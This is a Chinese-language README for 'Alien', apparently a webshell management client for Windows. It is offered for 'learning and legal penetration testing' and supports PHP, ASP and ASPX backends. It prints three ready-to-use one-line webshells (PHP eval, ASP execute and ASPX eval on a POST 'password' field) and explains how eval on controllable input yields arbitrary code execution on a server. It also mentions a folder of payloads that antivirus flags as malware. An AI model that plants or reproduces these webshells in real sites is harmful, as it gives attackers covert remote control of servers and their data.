# Alien

網站管理工具

## Author
- [@ISSAC](https://www.github.com/malbuffer4pt)

# 免責聲明
工具只限用於學習用途，網站管理和合法滲透測試，不可用於非法用途。\
如非法使用則後果自負。

## 工具平台
Windows

## 語言
C# .NET Framework V4.8

## 一句話木馬
一句話木馬是在滲透測試中用來控制伺服器的工具\
強大之處在於木馬本身體積小，不易發現\
以下是最簡單的一句話木馬

- PHP
```<?php @eval($_POST['password']);?>```
- ASP
```<%execute(request("password"))%>```
- ASPX
```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```

當然, Alien還可以使用asmx, ashx的Webshell。

## 伺服器
Windows Linux Unix MacOS

## Database管理
- MySQL : PHP
- Access : https://github.com/malbuffer4pt/DBer
- SQL Server : ASP ASPX ASMX ASHX

## 原理
以PHP為例子, eval()可以把string以PHP Code去執行，\
如果eval()中帶有可控變數，那麼就可以執行任意程式碼。\
如eval($_POST['a']);\
HTTP POST a=phpinfo(); 就可以執行phpinfo();

## 注意!
- 工具Payloads資料夾內有符合惡意程式的Payload, 可能會被防毒刪除
- 目前只有刪減版，但部份程式碼沒有刪除，Disassemble應該會有奇怪但無法使用的東西

## 圖片

![1](https://github.com/malbuffer4pt/Alien/blob/main/1.png)
![2](https://github.com/malbuffer4pt/Alien/blob/main/2.png)
![3](https://github.com/malbuffer4pt/Alien/blob/main/3.png)
![4](https://github.com/malbuffer4pt/Alien/blob/main/4.png)

## 致謝
研究webshell的各位前輩
